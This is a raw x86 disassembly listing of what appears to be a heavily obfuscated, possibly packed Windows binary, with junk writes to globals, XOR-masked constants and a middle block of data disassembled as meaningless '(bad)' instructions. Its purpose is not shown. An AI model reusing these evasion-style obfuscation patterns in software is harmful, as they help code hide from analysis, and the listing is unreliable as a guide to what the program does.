  420e4a:	pusha  
  420e4b:	repz pop edi
  420e4d:	mov    ebx,0x60ad1661
  420e52:	inc    ebx
  420e53:	push   es
  420e54:	jbe    0x420e44
  420e56:	jns    0x420e97
  420e58:	sub    edx,0x29ad
  420e5e:	mov    esi,DWORD PTR ds:0x4281cb
  420e64:	sbb    DWORD PTR ds:0x4283bf,esi
  420e6a:	imul   edx,eax
  420e6d:	cmp    DWORD PTR ds:0x4283db,0x0
  420e74:	mov    DWORD PTR ds:0x428293,ebx
  420e7a:	mov    DWORD PTR ds:0x4281cb,0x153
  420e84:	jmp    0x420efa
  420e89:	mov    eax,ds:0x4281bf
  420e8e:	mov    DWORD PTR ds:0x4282a3,0x776f
  420e98:	cmp    DWORD PTR ds:0x4283db,0x0
  420e9f:	jle    0x420ecd
  420ea5:	push   0x428277
  420eaa:	push   0x4280df
  420eaf:	call   DWORD PTR ds:0x428e98
  420eb5:	add    ecx,DWORD PTR ds:0x4283d7
  420ebb:	xor    esi,DWORD PTR ds:0x42826f
  420ec1:	adc    DWORD PTR ds:0x4282c7,edx
  420ec7:	xor    DWORD PTR ds:0x42834f,edx
  420ecd:	mov    esi,DWORD PTR ds:0x42827b
  420ed3:	or     esi,DWORD PTR ds:0x4281d7
  420ed9:	mov    DWORD PTR ds:0x42827b,esi
  420edf:	and    ecx,ecx
  420ee1:	neg    DWORD PTR ds:0x4282af
  420ee7:	dec    ecx
  420ee8:	movzx  eax,WORD PTR ds:0x428197
  420eef:	sbb    eax,DWORD PTR ds:0x42834b
  420ef5:	mov    ds:0x428197,eax
  420efa:	mov    eax,DWORD PTR [ebp-0x90]
  420f00:	xor    esi,esi
  420f02:	add    esi,DWORD PTR ds:0x428247
  420f08:	xor    ecx,ecx
  420f0a:	add    ecx,DWORD PTR ds:0x42839f
  420f10:	sub    ecx,esi
  420f12:	xor    esi,DWORD PTR [esi+ecx*1]
  420f15:	lea    eax,[eax+edx*1+0x14f2e240]
  420f1c:	cmp    DWORD PTR ds:0x42834f,0x0
  420f23:	mov    DWORD PTR ds:0x4282e3,0x1362
  420f2d:	mov    DWORD PTR ds:0x428293,edx
  420f33:	mov    DWORD PTR ds:0x4282cf,edi
  420f39:	jmp    0x421029
  420f3e:	mov    DWORD PTR ds:0x4283b3,0xeb5
  420f48:	cmp    DWORD PTR ds:0x42834f,0x0
  420f4f:	ja     0x420f81
  420f55:	push   DWORD PTR [ebp-0x24]
  420f58:	push   DWORD PTR [ebp-0x14]
  420f5b:	push   DWORD PTR [ebp-0x14]
  420f5e:	call   DWORD PTR ds:0x428f10
  420f64:	neg    ecx
  420f66:	xor    esi,esi
  420f68:	or     esi,DWORD PTR ds:0x42821f
  420f6e:	xor    edx,edx
  420f70:	add    edx,DWORD PTR ds:0x42822b
  420f76:	sub    edx,esi
  420f78:	or     esi,DWORD PTR [esi+edx*1]
  420f7b:	sub    DWORD PTR ds:0x4282a7,ecx
  420f81:	mov    edx,DWORD PTR ds:0x42829f
  420f87:	sbb    edx,DWORD PTR ds:0x4283e7
  420f8d:	mov    DWORD PTR ds:0x42829f,edx
  420f93:	add    DWORD PTR ds:0x4281db,ecx
  420f99:	sub    DWORD PTR ds:0x4283cb,0x42833b
  420fa3:	cmp    DWORD PTR ds:0x4282c7,0x0
  420faa:	mov    ecx,DWORD PTR ds:0x4283ab
  420fb0:	movzx  edx,BYTE PTR ds:0x4281b3
  420fb7:	mov    DWORD PTR ds:0x428337,0x5580
  420fc1:	mov    DWORD PTR ds:0x4283e3,edi
  420fc7:	jmp    0x421029
  420fcc:	mov    DWORD PTR ds:0x4283e7,0x673a
  420fd6:	cmp    DWORD PTR ds:0x4282c7,0x0
  420fdd:	jle    0x420ffa
  420fe3:	push   DWORD PTR [ebp-0x20]
  420fe6:	call   DWORD PTR ds:0x428db4
  420fec:	xor    esi,edx
  420fee:	add    ecx,0x6ba8
  420ff4:	xor    edx,0x4b1f
  420ffa:	mov    edx,DWORD PTR ds:0x428347
  421000:	sbb    DWORD PTR ds:0x4282c3,edx
  421006:	movzx  edx,WORD PTR ds:0x42819b
  42100d:	or     edx,DWORD PTR ds:0x4283c3
  421013:	mov    DWORD PTR ds:0x42819b,edx
  421019:	dec    DWORD PTR ds:0x4283b3
  42101f:	sub    DWORD PTR ds:0x4282bf,0x689b
  421029:	mov    DWORD PTR [ebp-0x174],eax
  42102f:	mov    eax,DWORD PTR [ebp-0x24]
  421032:	mov    ecx,DWORD PTR [ebp-0x94]
  421038:	add    esi,edx
  42103a:	mov    edx,DWORD PTR [ebp-0x10]
  42103d:	neg    esi
  42103f:	xor    edx,ecx
  421041:	cmp    DWORD PTR ds:0x4281ab,0x0
  421048:	mov    DWORD PTR ds:0x4283b7,0x62d9
  421052:	mov    DWORD PTR ds:0x428197,0x300d
  42105c:	mov    DWORD PTR ds:0x42819b,0x20bd
  421066:	mov    ecx,DWORD PTR ds:0x42833f
  42106c:	jmp    0x4210b5
  421071:	mov    DWORD PTR ds:0x4283af,0x134d
  42107b:	cmp    DWORD PTR ds:0x4281ab,0x0
  421082:	jae    0x4210a9
  421088:	push   DWORD PTR [ebp-0xc]
  42108b:	push   0x4ac4
  421090:	push   DWORD PTR [ebp-0x24]
  421093:	push   0x863f
  421098:	push   DWORD PTR [ebp-0x28]
  42109b:	call   DWORD PTR ds:0x428dd4
  4210a1:	sbb    ecx,DWORD PTR ds:0x4282c3
  4210a7:	adc    esi,esi
  4210a9:	and    DWORD PTR ds:0x4282e7,edi
  4210af:	sbb    ecx,DWORD PTR ds:0x4281a3
  4210b5:	add    edx,DWORD PTR [ebp-0x78]
  4210b8:	mov    ecx,DWORD PTR [ebp-0xc0]
  4210be:	lea    ecx,[edx+ecx*1+0x6ac1]
  4210c5:	and    ecx,eax
  4210c7:	mov    eax,0x1101
  4210cc:	sub    eax,ecx
  4210ce:	add    eax,DWORD PTR [ebp+0x8]
  4210d1:	mov    DWORD PTR [ebp-0x170],eax
  4210d7:	mov    DWORD PTR [ebp-0x15c],0xca79a575
  4210e1:	mov    DWORD PTR [ebp-0x158],0x9c1b89e8
  4210eb:	mov    DWORD PTR [ebp-0x154],0xca79a571
  4210f5:	mov    DWORD PTR [ebp-0x150],0x9c1b89e8
  4210ff:	mov    esi,DWORD PTR [ebp-0x174]
  421105:	mov    eax,DWORD PTR [ebp-0x154]
  42110b:	mov    edx,DWORD PTR [ebp-0x150]
  421111:	xor    eax,0xca79a575
  421116:	xor    edx,0x9c1b89e8
  42111c:	mov    cl,0x2
  42111e:	call   0x40a9b5
  421123:	mov    edi,eax
  421125:	mov    ebx,edx
  421127:	mov    eax,DWORD PTR [ebp-0x154]
  42112d:	mov    edx,DWORD PTR [ebp-0x150]
  421133:	xor    eax,0xca79a575
  421138:	xor    edx,0x9c1b89e8
  42113e:	mov    cl,0x3e
  421140:	call   0x42227c
  421145:	or     edi,eax
  421147:	or     ebx,edx
  421149:	jmp    0x4213bf
  42114e:	test   al,0x92
  421150:	fdivr  st,st(3)
  421152:	and    bh,BYTE PTR [edx]
  421154:	call   0xf3bc:0x65828d2a
  42115b:	add    eax,0xfc1bcd3
  421160:	push   ss
  421161:	sbb    BYTE PTR [edi+0x14],ch
  421164:	sbb    BYTE PTR [eax],bl
  421166:	pop    eax
  421167:	mov    al,0x9
  421169:	loope  0x421197
  42116b:	sub    esp,eax
  42116d:	and    al,0x1f
  42116f:	xchg   DWORD PTR [ebx],esp
  421171:	(bad)  
  421172:	stos   DWORD PTR es:[edi],eax
  421173:	mov    cx,0x9708
  421177:	iret   
  421178:	mov    esi,0x52a6865a
  42117d:	(bad)  
  421180:	add    eax,0xffffffd4
  421183:	arpl   WORD PTR [ecx],cx
  421185:	sbb    al,0x33
  421187:	repnz test eax,0xfaad397a
  42118d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42118e:	(bad)  
  42118f:	fld    TBYTE PTR [edx+edx*8+0x54f65155]
  421196:	pushf  
  421197:	or     DWORD PTR [eax-0x22],esi
  42119a:	outs   dx,BYTE PTR ds:[esi]
  42119b:	or     al,0xf5
  42119d:	pop    edx
  42119e:	dec    ebx
  42119f:	cmp    DWORD PTR [esi],ebp
  4211a1:	cwde   
  4211a2:	xor    al,0x23
  4211a4:	push   0xffffffd5
  4211a6:	mov    edx,0xd168a1d4
  4211ab:	or     eax,0x85daef4d
  4211b0:	iret   
  4211b1:	sub    al,0x3
  4211b3:	fmul   st,st(2)
  4211b5:	pop    esp
  4211b6:	repz aam 0x9c
  4211b9:	dec    eax
  4211ba:	adc    DWORD PTR [edi+esi*2+0x2d643c65],eax
  4211c1:	addr16 add esp,eax
  4211c4:	(bad)  
  4211c5:	neg    cl
  4211c7:	sahf   
  4211c8:	cmp    BYTE PTR [ebx+0x3b],bh
  4211cb:	pop    esi
  4211cc:	cli    
  4211cd:	jae    0x421216
  4211cf:	sub    BYTE PTR [ecx+0x2faefe38],ch
  4211d5:	xbegin 0xb6a52f8e
  4211db:	outs   dx,DWORD PTR ds:[esi]
  4211dc:	fucom  st(0)
  4211de:	ss pop edi
  4211e0:	imul   eax,eax,0x31
  4211e3:	popa   
  4211e4:	and    eax,0xbcf0365c
  4211e9:	or     BYTE PTR [esi+eax*1-0x69],al
  4211ed:	enter  0x12fe,0x8c
  4211f1:	adc    BYTE PTR [ebx+0x76],al
  4211f4:	and    esi,DWORD PTR [ebx]
  4211f6:	mov    bh,0xd0
  4211f8:	inc    ebx
  4211f9:	adc    edi,DWORD PTR [ecx-0x449dbfb]
  4211ff:	mov    eax,0xd45b521e
  421204:	daa    
  421205:	(bad)  
  421206:	fsubr  QWORD PTR [eax]
  421208:	enter  0x233d,0x6
  42120c:	bound  esi,QWORD PTR ds:0x549cd8f4
  421212:	int    0x9a
  421214:	cmp    DWORD PTR [ecx],ebx
  421216:	mov    ebx,0xfbc38f67
  42121b:	cmc    
  42121c:	push   esi
  42121d:	pop    esi
  42121e:	(bad)  
  42121f:	call   0xcdf1:0x393cf97a
  421226:	int3   
  421227:	push   es
  421228:	(bad)  
  42122a:	adc    bh,BYTE PTR [ebx+esi*1+0x4dae0294]
  421231:	xor    DWORD PTR [esi+0x1e20aa6b],0x7105979
  42123b:	popa   
  42123c:	push   esi
  42123d:	dec    esi
  42123e:	out    0x99,eax
  421240:	in     eax,0xa5
  421242:	test   eax,0x983406b6
  421247:	pop    ss
  421248:	sbb    esi,DWORD PTR [esi]
  42124a:	inc    esp
  42124b:	div    ch
  42124d:	dec    ebp
  42124e:	dec    eax
  42124f:	mov    WORD PTR [ebx+0x1a],ds
  421252:	into   
  421253:	out    dx,al
  421254:	ret    
  421255:	iret   
  421256:	scas   al,BYTE PTR es:[edi]
  421257:	or     bh,BYTE PTR [edx-0x1633bd85]
  42125d:	es out dx,eax
  42125f:	pop    edx
  421260:	and    al,0x81
  421262:	and    al,0x12
  421264:	xor    eax,0x23f052fe
  421269:	outs   dx,BYTE PTR ds:[esi]
  42126a:	inc    eax
  42126b:	mov    bh,0xb
  42126d:	mov    eax,0x3c959295
  421272:	jno    0x42129a
  421274:	sar    BYTE PTR [esi-0xc],cl
  421277:	mov    edi,gs
  421279:	call   DWORD PTR [eax]
  42127b:	(bad)  
  42127c:	test   eax,0xab25f984
  421281:	adc    dh,0xba
  421284:	jne    0x4212a0
  421286:	inc    eax
  421287:	jge    0x421231
  421289:	cmp    BYTE PTR [ebx-0x46f14ef3],ah
  42128f:	das    
  421290:	test   DWORD PTR [edx-0x3a7e7898],ebp
  421296:	pop    ebx
  421297:	lods   eax,DWORD PTR ds:[esi]
  421298:	and    edi,DWORD PTR [edx]
  42129a:	dec    esi
  42129b:	xor    DWORD PTR ds:0xf7e08d0a,edx
  4212a1:	pop    ss
  4212a2:	fld    QWORD PTR ss:[eax+0x180bc3ee]
  4212a9:	inc    eax
  4212aa:	ret    0xf12b
  4212ad:	push   ebp
  4212ae:	in     al,dx
  4212af:	xor    eax,0x1f4ea206
  4212b4:	jecxz  0x42131e
  4212b6:	adc    DWORD PTR [ebx],0xffffff89
  4212b9:	cwde   
  4212ba:	aam    0x7b
  4212bc:	pop    es
  4212bd:	je     0x421328
  4212bf:	xchg   esi,eax
  4212c0:	or     al,0x90
  4212c2:	pop    esp
  4212c3:	int3   
  4212c4:	mov    edx,0xa540a303
  4212c9:	sbb    BYTE PTR [edx-0x54],ch
  4212cc:	mov    ds:0xad3e023d,eax
  4212d1:	and    ax,0x657f
  4212d5:	shl    BYTE PTR [esi-0x3573baa4],0x4
  4212dc:	push   cs
  4212dd:	sub    al,0x3d
  4212df:	mov    ebp,0xb502cbb9
  4212e4:	stos   BYTE PTR es:[edi],al
  4212e5:	dec    ebp
  4212e6:	add    ebp,DWORD PTR [eax]
  4212e8:	mov    al,0xa4
  4212ea:	mov    bh,0x93
  4212ec:	cmp    DWORD PTR [ebx],esp
  4212ee:	xor    esi,esp
  4212f0:	out    dx,eax
  4212f1:	push   0xa7fe8989
  4212f6:	adc    DWORD PTR ds:0x5b7978f4,0xffffff92
  4212fd:	stos   BYTE PTR es:[edi],al
  4212fe:	or     dh,ch
  421300:	data16 sahf 
  421302:	out    0x64,eax
  421304:	mov    dl,0x35
  421306:	lahf   
  421307:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421308:	adc    esp,DWORD PTR gs:[eax+0x38809dab]
  42130f:	xchg   edx,eax
  421310:	aaa    
  421311:	rcl    DWORD PTR es:[ebx],1
  421314:	js     0x42134e
  421316:	test   DWORD PTR es:[edx],edx
  421319:	shr    DWORD PTR [edx-0x13],cl
  42131c:	jl     0x421373
  42131e:	clc    
  42131f:	test   esp,esp
  421321:	mov    cl,0xc6
  421323:	jmp    0x7d6c:0xcc91165b
  42132a:	push   ebx
  42132b:	mov    cl,0x7b
  42132d:	aam    0x9c
  42132f:	iret   
  421330:	sahf   
  421331:	movups xmm0,XMMWORD PTR [ebx+edx*2-0x35fdf1d9]
  421339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42133a:	sub    ebx,DWORD PTR [ebx]
  42133c:	inc    edx
  42133d:	cmp    DWORD PTR [ecx+0x2a669330],eax
  421343:	mov    edx,0xfcc36714
  421348:	xlat   BYTE PTR ds:[ebx]
  421349:	push   eax
  42134a:	test   BYTE PTR [ebx+0x22],ah
  42134d:	std    
  42134e:	icebp  
  42134f:	and    DWORD PTR [esi+0x4c610e78],eax
  421355:	jle    0x42136d
  421357:	call   0x8111cda1
  42135c:	ins    DWORD PTR es:[edi],dx
  42135d:	mov    esp,DWORD PTR ds:0x1c4323b
  421363:	sahf   
  421364:	mov    dh,0x3f
  421366:	lods   eax,DWORD PTR ds:[esi]
  421367:	mov    edx,0xbb8eed9f
  42136c:	pop    ss
  42136d:	jg     0x421395
  42136f:	push   ecx
  421370:	mov    cs,WORD PTR [eax-0x68]
  421373:	cld    
  421374:	in     al,0x59
  421376:	push   eax
  421377:	push   0xa7bec045
  42137c:	cld    
  42137d:	push   ds
  42137e:	inc    edx
  42137f:	mov    eax,0x3474a24e
  421384:	cmp    eax,0xf0fc4190
  421389:	divps  xmm7,XMMWORD PTR [ebx-0x6a]
  42138d:	pop    esp
  42138e:	ins    DWORD PTR es:[edi],dx
  42138f:	mov    ds:0xb8639a97,eax
  421394:	xlat   BYTE PTR ds:[ebx]
  421395:	and    bl,BYTE PTR [edx-0xa]
  421398:	add    dh,BYTE PTR ds:0xcdd385fa
  42139e:	jae    0x42132f
  4213a0:	or     al,ch
  4213a2:	xor    eax,0xae0fd7fa
  4213a7:	(bad)  
  4213a8:	aad    0x6
  4213aa:	sbb    ebx,DWORD PTR [ecx-0x2949be84]
  4213b0:	repz daa 
  4213b2:	icebp  
  4213b3:	lds    edi,FWORD PTR [esp+ebp*2]
  4213b6:	xlat   BYTE PTR ds:[ebx]
  4213b7:	adc    ah,dl
  4213b9:	jl     0x42133c
  4213bb:	cdq    
  4213bc:	icebp  
  4213bd:	lds    ebx,FWORD PTR [eax]
  4213bf:	mov    eax,DWORD PTR [ebp-0x15c]
  4213c5:	mov    edx,DWORD PTR [ebp-0x158]
  4213cb:	xor    eax,0xca79a575
  4213d0:	xor    edx,0x9c1b89e8
  4213d6:	mov    cl,0x2
  4213d8:	call   0x40a9b5
  4213dd:	mov    ecx,edx
  4213df:	mov    edx,DWORD PTR [ebp-0x15c]
  4213e5:	mov    DWORD PTR [ebp-0x218],esi
  4213eb:	mov    esi,DWORD PTR [ebp-0x158]
  4213f1:	xor    edx,0xca79a575
  4213f7:	xor    esi,0x9c1b89e8
  4213fd:	mov    DWORD PTR [ebp-0x21c],eax
  421403:	mov    eax,edx
  421405:	mov    edx,esi
  421407:	mov    DWORD PTR [ebp-0x220],ecx
  42140d:	mov    cl,0x3e
  42140f:	call   0x42227c
  421414:	mov    esi,DWORD PTR [ebp-0x21c]
  42141a:	or     esi,eax
  42141c:	mov    eax,DWORD PTR [ebp-0x220]
  421422:	or     eax,edx
  421424:	push   eax
  421425:	push   esi
  421426:	push   ebx
  421427:	push   edi
  421428:	call   0x416c20
  42142d:	mov    esi,DWORD PTR [ebp-0x218]
  421433:	cmp    esi,eax
  421435:	jne    0x4214eb
  42143b:	mov    eax,DWORD PTR [ebp-0x154]
  421441:	mov    edx,DWORD PTR [ebp-0x150]
  421447:	xor    eax,0xca79a575
  42144c:	xor    edx,0x9c1b89e8
  421452:	mov    cl,0x2
  421454:	call   0x40a9b5
  421459:	mov    esi,eax
  42145b:	mov    edi,edx
  42145d:	mov    eax,DWORD PTR [ebp-0x154]
  421463:	mov    edx,DWORD PTR [ebp-0x150]
  421469:	xor    eax,0xca79a575
  42146e:	xor    edx,0x9c1b89e8
  421474:	mov    cl,0x3e
  421476:	call   0x42227c
  42147b:	or     esi,eax
  42147d:	or     edi,edx
  42147f:	mov    eax,DWORD PTR [ebp-0x15c]
  421485:	mov    edx,DWORD PTR [ebp-0x158]
  42148b:	xor    eax,0xca79a575
  421490:	xor    edx,0x9c1b89e8
  421496:	mov    cl,0x2
  421498:	call   0x40a9b5
  42149d:	mov    ebx,eax
  42149f:	mov    eax,edx
  4214a1:	mov    ecx,DWORD PTR [ebp-0x15c]
  4214a7:	mov    edx,DWORD PTR [ebp-0x158]
  4214ad:	xor    ecx,0xca79a575
  4214b3:	xor    edx,0x9c1b89e8
  4214b9:	mov    DWORD PTR [ebp-0x224],eax
  4214bf:	mov    eax,ecx
  4214c1:	mov    cl,0x3e
  4214c3:	call   0x42227c
  4214c8:	or     ebx,eax
  4214ca:	mov    eax,DWORD PTR [ebp-0x224]
  4214d0:	or     eax,edx
  4214d2:	push   eax
  4214d3:	push   ebx
  4214d4:	push   edi
  4214d5:	push   esi
  4214d6:	call   0x416c20
  4214db:	mov    DWORD PTR [ebp-0x178],eax
  4214e1:	jmp    0x4217ab
  4214e6:	jmp    0x421761
  4214eb:	lea    eax,[ebp-0x168]
  4214f1:	mov    DWORD PTR [ebp-0x164],eax
  4214f7:	mov    eax,DWORD PTR [ebp-0x164]
  4214fd:	mov    DWORD PTR [eax],0xa4069aae
  421503:	mov    eax,DWORD PTR [ebp-0x168]
  421509:	xor    eax,0xa4069aae
  42150e:	shr    eax,0x2
  421511:	mov    ecx,DWORD PTR [ebp-0x168]
  421517:	xor    ecx,0xa4069aae
  42151d:	shl    ecx,0x1e
  421520:	or     eax,ecx
  421522:	mov    ecx,DWORD PTR [ebp-0x174]
  421528:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  42152c:	mov    DWORD PTR [ebp-0x160],eax
  421532:	mov    esi,DWORD PTR [ebp-0x160]
  421538:	mov    eax,DWORD PTR [ebp-0x154]
  42153e:	mov    edx,DWORD PTR [ebp-0x150]
  421544:	xor    eax,0xca79a575
  421549:	xor    edx,0x9c1b89e8
  42154f:	mov    cl,0x2
  421551:	call   0x40a9b5
  421556:	mov    edi,eax
  421558:	mov    ebx,edx
  42155a:	mov    eax,DWORD PTR [ebp-0x154]
  421560:	mov    edx,DWORD PTR [ebp-0x150]
  421566:	xor    eax,0xca79a575
  42156b:	xor    edx,0x9c1b89e8
  421571:	mov    cl,0x3e
  421573:	call   0x42227c
  421578:	or     edi,eax
  42157a:	or     ebx,edx
  42157c:	mov    eax,DWORD PTR [ebp-0x15c]
  421582:	mov    edx,DWORD PTR [ebp-0x158]
  421588:	xor    eax,0xca79a575
  42158d:	xor    edx,0x9c1b89e8
  421593:	mov    cl,0x2
  421595:	call   0x40a9b5
  42159a:	mov    ecx,edx
  42159c:	mov    edx,DWORD PTR [ebp-0x15c]
  4215a2:	mov    DWORD PTR [ebp-0x228],esi
  4215a8:	mov    esi,DWORD PTR [ebp-0x158]
  4215ae:	xor    edx,0xca79a575
  4215b4:	xor    esi,0x9c1b89e8
  4215ba:	mov    DWORD PTR [ebp-0x22c],eax
  4215c0:	mov    eax,edx
  4215c2:	mov    edx,esi
  4215c4:	mov    DWORD PTR [ebp-0x230],ecx
  4215ca:	mov    cl,0x3e
  4215cc:	call   0x42227c
  4215d1:	mov    esi,DWORD PTR [ebp-0x22c]
  4215d7:	or     esi,eax
  4215d9:	mov    eax,DWORD PTR [ebp-0x230]
  4215df:	or     eax,edx
  4215e1:	push   eax
  4215e2:	push   esi
  4215e3:	push   ebx
  4215e4:	push   edi
  4215e5:	call   0x416c20
  4215ea:	mov    esi,DWORD PTR [ebp-0x228]
  4215f0:	cmp    esi,eax
  4215f2:	je     0x421667
  4215f8:	mov    eax,DWORD PTR [ebp-0x154]
  4215fe:	mov    edx,DWORD PTR [ebp-0x150]
  421604:	xor    eax,0xca79a575
  421609:	xor    edx,0x9c1b89e8
  42160f:	mov    cl,0x2
  421611:	call   0x40a9b5
  421616:	mov    esi,eax
  421618:	mov    edi,edx
  42161a:	mov    eax,DWORD PTR [ebp-0x154]
  421620:	mov    edx,DWORD PTR [ebp-0x150]
  421626:	xor    eax,0xca79a575
  42162b:	xor    edx,0x9c1b89e8
  421631:	mov    cl,0x3e
  421633:	call   0x42227c
  421638:	or     esi,eax
  42163a:	or     edi,edx
  42163c:	mov    eax,DWORD PTR [ebp-0x160]
  421642:	imul   esi,eax
  421645:	add    esi,DWORD PTR [ebp-0x170]
  42164b:	mov    DWORD PTR [ebp-0x16c],esi
  421651:	mov    eax,DWORD PTR [ebp-0x16c]
  421657:	mov    DWORD PTR [ebp-0x178],eax
  42165d:	jmp    0x4217ab
  421662:	jmp    0x421712
  421667:	mov    eax,DWORD PTR [ebp-0x154]
  42166d:	mov    edx,DWORD PTR [ebp-0x150]
  421673:	xor    eax,0xca79a575
  421678:	xor    edx,0x9c1b89e8
  42167e:	mov    cl,0x2
  421680:	call   0x40a9b5
  421685:	mov    esi,eax
  421687:	mov    edi,edx
  421689:	mov    eax,DWORD PTR [ebp-0x154]
  42168f:	mov    edx,DWORD PTR [ebp-0x150]
  421695:	xor    eax,0xca79a575
  42169a:	xor    edx,0x9c1b89e8
  4216a0:	mov    cl,0x3e
  4216a2:	call   0x42227c
  4216a7:	or     esi,eax
  4216a9:	or     edi,edx
  4216ab:	mov    eax,DWORD PTR [ebp-0x15c]
  4216b1:	mov    edx,DWORD PTR [ebp-0x158]
  4216b7:	xor    eax,0xca79a575
  4216bc:	xor    edx,0x9c1b89e8
  4216c2:	mov    cl,0x2
  4216c4:	call   0x40a9b5
  4216c9:	mov    ebx,eax
  4216cb:	mov    eax,edx
  4216cd:	mov    ecx,DWORD PTR [ebp-0x15c]
  4216d3:	mov    edx,DWORD PTR [ebp-0x158]
  4216d9:	xor    ecx,0xca79a575
  4216df:	xor    edx,0x9c1b89e8
  4216e5:	mov    DWORD PTR [ebp-0x234],eax
  4216eb:	mov    eax,ecx
  4216ed:	mov    cl,0x3e
  4216ef:	call   0x42227c
  4216f4:	or     ebx,eax
  4216f6:	mov    eax,DWORD PTR [ebp-0x234]
  4216fc:	or     eax,edx
  4216fe:	push   eax
  4216ff:	push   ebx
  421700:	push   edi
  421701:	push   esi
  421702:	call   0x416c20
  421707:	mov    DWORD PTR [ebp-0x178],eax
  42170d:	jmp    0x4217ab
  421712:	mov    eax,DWORD PTR [ebp-0x15c]
  421718:	mov    edx,DWORD PTR [ebp-0x158]
  42171e:	xor    eax,0xca79a575
  421723:	xor    edx,0x9c1b89e8
  421729:	mov    cl,0x2
  42172b:	call   0x40a9b5
  421730:	mov    esi,eax
  421732:	mov    edi,edx
  421734:	mov    eax,DWORD PTR [ebp-0x15c]
  42173a:	mov    edx,DWORD PTR [ebp-0x158]
  421740:	xor    eax,0xca79a575
  421745:	xor    edx,0x9c1b89e8
  42174b:	mov    cl,0x3e
  42174d:	call   0x42227c
  421752:	or     esi,eax
  421754:	or     edi,edx
  421756:	mov    DWORD PTR [ebp-0x178],esi
  42175c:	jmp    0x4217ab
  421761:	mov    eax,DWORD PTR [ebp-0x15c]
  421767:	mov    edx,DWORD PTR [ebp-0x158]
  42176d:	xor    eax,0xca79a575
  421772:	xor    edx,0x9c1b89e8
  421778:	mov    cl,0x2
  42177a:	call   0x40a9b5
  42177f:	mov    esi,eax
  421781:	mov    edi,edx
  421783:	mov    eax,DWORD PTR [ebp-0x15c]
  421789:	mov    edx,DWORD PTR [ebp-0x158]
  42178f:	xor    eax,0xca79a575
  421794:	xor    edx,0x9c1b89e8
  42179a:	mov    cl,0x3e
  42179c:	call   0x42227c
  4217a1:	or     esi,eax
  4217a3:	or     edi,edx
  4217a5:	mov    DWORD PTR [ebp-0x178],esi
  4217ab:	mov    ecx,DWORD PTR [ebp-0xd8]
  4217b1:	mov    eax,0x459a
  4217b6:	xor    edx,edx
  4217b8:	div    ecx
  4217ba:	mov    ecx,DWORD PTR [ebp-0xdc]
  4217c0:	and    eax,ecx
  4217c2:	add    eax,DWORD PTR [ebp-0x44]
  4217c5:	mov    ecx,DWORD PTR [ebp-0xe0]
  4217cb:	lea    eax,[eax+ecx*1+0x272f]
  4217d2:	xor    eax,0x1080c
  4217d7:	add    eax,DWORD PTR [ebp-0x178]
  4217dd:	mov    DWORD PTR [ebp-0xe8],eax
  4217e3:	mov    DWORD PTR [ebp-0xc],0x5950
  4217ea:	mov    DWORD PTR [ebp-0xf8],0x4964
  4217f4:	mov    DWORD PTR [ebp-0x130],0x3
  4217fe:	mov    DWORD PTR [ebp-0x20],0x2df9
  421805:	mov    DWORD PTR [ebp-0x8],0x4524
  42180c:	mov    DWORD PTR [ebp-0xd4],0x637e
  421816:	mov    DWORD PTR [ebp-0x110],0x38c8
  421820:	mov    DWORD PTR [ebp-0xa4],0x7118
  42182a:	mov    DWORD PTR [ebp-0xa0],0xaf6
  421834:	mov    DWORD PTR [ebp-0x10c],0x3315
  42183e:	mov    eax,DWORD PTR [ebp-0xf8]
  421844:	mov    ecx,DWORD PTR [ebp-0x130]
  42184a:	xor    edx,edx
  42184c:	div    ecx
  42184e:	add    eax,0x454e
  421853:	mov    ecx,DWORD PTR [ebp-0xc]
  421856:	and    eax,ecx
  421858:	xor    eax,0x5940
  42185d:	add    eax,DWORD PTR [ebp+0x8]
  421860:	mov    ecx,DWORD PTR [ebp-0x110]
  421866:	mov    edx,DWORD PTR [ebp-0xa4]
  42186c:	sub    ecx,edx
  42186e:	mov    edx,DWORD PTR [ebp-0xd4]
  421874:	or     ecx,edx
  421876:	mov    edx,DWORD PTR [ebp-0x8]
  421879:	and    ecx,edx
  42187b:	mov    edx,DWORD PTR [ebp-0x20]
  42187e:	xor    ecx,edx
  421880:	mov    edx,DWORD PTR [ebp-0x10c]
  421886:	mov    esi,0x180f
  42188b:	sub    esi,edx
  42188d:	mov    edx,DWORD PTR [ebp-0xa0]
  421893:	imul   esi,edx
  421896:	xor    esi,0x402b
  42189c:	xor    esi,0xfed78c17
  4218a2:	mov    edx,DWORD PTR [ebp-0xe8]
  4218a8:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  4218af:	add    ecx,eax
  4218b1:	add    esi,ecx
  4218b3:	mov    DWORD PTR [ebp-0x38],esi
  4218b6:	mov    DWORD PTR [ebp-0x4],0x59a8
  4218bd:	mov    DWORD PTR [ebp-0x30],0x7021
  4218c4:	mov    DWORD PTR [ebp-0xf4],0x6210
  4218ce:	mov    DWORD PTR [ebp-0x58],0x73d5
  4218d5:	mov    DWORD PTR [ebp-0x124],0x1e7d
  4218df:	mov    DWORD PTR [ebp-0x3c],0x3144
  4218e6:	mov    eax,DWORD PTR [ebp-0x30]
  4218e9:	xor    eax,0x75cb
  4218ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4218f1:	imul   eax,ecx
  4218f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4218f7:	lea    ecx,[ecx+eax*1-0x2123b90]
  4218fe:	mov    eax,DWORD PTR [ebp-0xf4]
  421904:	and    eax,0x6b34
  421909:	and    eax,0x658d
  42190e:	xor    edx,edx
  421910:	push   0x6
  421912:	pop    esi
  421913:	div    esi
  421915:	imul   eax,eax,0x3fb9
  42191b:	mov    edx,DWORD PTR [ebp-0x3c]
  42191e:	and    edx,0x58c7
  421924:	mov    esi,DWORD PTR [ebp-0x124]
  42192a:	or     edx,esi
  42192c:	add    edx,0x7a25
  421932:	imul   edx,edx,0x28d2
  421938:	mov    esi,DWORD PTR [ebp-0x58]
  42193b:	xor    edx,esi
  42193d:	xor    edx,0x1856f731
  421943:	mov    esi,DWORD PTR [ebp-0xe8]
  421949:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  421950:	add    eax,ecx
  421952:	add    edx,eax
  421954:	mov    DWORD PTR [ebp-0xac],edx
  42195a:	mov    DWORD PTR [ebp-0x54],0x1
  421961:	mov    DWORD PTR [ebp-0x40],0x1ee8
  421968:	mov    DWORD PTR [ebp-0x1c],0x64d8
  42196f:	mov    DWORD PTR [ebp-0xf0],0x5a06
